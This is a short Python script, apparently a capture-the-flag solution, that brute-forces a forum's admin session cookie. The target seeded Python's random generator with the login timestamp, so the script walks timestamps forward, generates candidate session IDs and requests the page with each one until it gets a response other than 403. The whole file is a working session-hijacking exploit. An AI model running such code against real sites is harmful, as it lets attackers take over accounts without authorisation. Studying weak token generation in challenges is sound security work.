#!/bin/python3
# The challenge here was to bruteforce the admin session cookie, which was using a 
# random number generator that was being initialized with random.seed

import random
import requests

# replace this with the desired value
url = 'http://forum.commensuratetechnology.com/section/4'

# find last admin login time in unix time and start to increase
# replace this with the desired value
counter = 1668359820

while True:
    random.seed(counter)
    session_id = f"{random.getrandbits(128):x}"
    x = requests.get(url, cookies = {"session": session_id})
    if x.status_code != 403:
        print("Admin ID: " + session_id)
        break
    counter += 1
